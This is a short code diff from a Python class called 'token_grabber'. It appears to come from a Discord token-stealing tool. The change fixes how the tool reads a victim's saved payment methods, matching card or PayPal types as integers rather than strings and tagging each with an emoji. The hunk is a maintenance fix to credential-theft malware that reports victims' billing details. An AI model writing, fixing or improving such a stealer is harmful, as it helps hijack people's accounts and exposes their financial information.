@@ -123,9 +123,9 @@ class token_grabber():
             else:
                 methods = ""
                 for method in b.json():
-                    if method['type'] == '1':
+                    if method['type'] == 1:
                         methods += "💳"
-                    elif method['type'] == '0':
+                    elif method['type'] == 0:
                         methods += "<:paypal:973417655627288666>"
                     else:
                         methods += "❓"
